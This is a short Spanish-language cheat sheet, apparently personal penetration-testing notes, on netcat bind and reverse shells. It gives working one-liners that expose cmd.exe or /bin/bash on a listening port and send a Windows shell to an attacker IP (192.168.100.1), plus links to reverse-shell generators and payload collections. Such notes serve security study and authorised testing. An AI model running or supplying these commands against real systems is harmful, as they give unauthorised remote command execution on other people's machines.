
**bind shell** -> target espera conexion en cierto puerto, entregando el comando dado en el parametro -e
```
target
 nc -lnvp 4444 -e cmd.exe
	
attackbox
 nc -nv 192.168.100.1 4444
```


Nota: para conexión a linux, se puede usar -e /bin/bash o bien -c /bin/bash


**reverse shell** -> target envia conexión hacia ip del atacante.
```
taget
 nc -nv 192.168.100.1 1234 -e cmd.exe
 
 attackbox
 nc -nlvp 1234
```

Recursos:
https://www.revshells.com/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md